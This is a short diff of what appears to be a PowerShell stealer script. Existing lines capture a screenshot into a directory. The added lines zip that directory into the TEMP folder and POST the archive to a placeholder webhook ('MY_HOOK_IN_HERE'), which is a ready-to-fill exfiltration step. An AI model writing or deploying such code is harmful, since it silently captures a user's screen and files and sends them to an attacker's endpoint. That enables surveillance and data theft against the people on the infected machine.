@@ -182,3 +182,7 @@ $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
 $bmp.Save("$dir\screenshot.png")
 $graphics.Dispose()
 $bmp.Dispose()
+
+Compress-Archive -Path $dir -DestinationPath "$env:TEMP\chuplen.zip"
+
+Invoke-RestMethod -Uri "MY_HOOK_IN_HERE" -Method Post -InFile "$env:TEMP\chuplen.zip"
